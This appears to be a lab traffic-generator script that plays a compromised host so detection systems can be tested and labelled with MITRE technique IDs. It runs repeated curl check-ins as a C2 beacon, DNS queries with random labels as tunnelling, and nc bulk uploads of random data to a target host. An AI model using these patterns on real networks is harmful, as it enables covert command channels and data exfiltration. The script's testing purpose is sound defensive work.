#!/bin/bash
# Compromised internal host: C2 beacon, DNS tunnelling, then a bulk upload (no rule for it).
set -uo pipefail
. /scripts/lib.sh
sleep "${WARMUP:-60}"

beacon() {
  local s; s=$(now)
  for _ in $(seq 1 "${BEACONS:-12}"); do
    curl -sk -o /dev/null --max-time 2 "https://$TARGET/check-in" || true   # self-signed cert
    sleep 60
  done
  gt BEACONING "\"$TARGET\"" "$s" "$(now)" detect '"T1071"'
}

tunnel() {
  local s label; s=$(now)
  for _ in $(seq 1 "${TUNNEL_QUERIES:-150}"); do
    label=$(head -c 32 /dev/urandom | base32 | tr -d '=' | tr 'A-Z' 'a-z' | cut -c1-52)
    dig +short +tries=1 +time=1 @"$TARGET" "$label.x.tunnel.lab" >/dev/null || true
    sleep 2
  done
  gt DNS_TUNNELING null "$s" "$(now)" detect '"T1048"'
}

beacon &
sleep 30
tunnel
s=$(now)
for _ in 1 2 3; do
  head -c 200000000 /dev/urandom | nc -N -w 5 "$TARGET" 9000 || true
  sleep 5
done
gt NOVEL_BULK_UPLOAD "\"$TARGET\"" "$s" "$(now)" detect '"T1048"'
wait
echo "implant done"
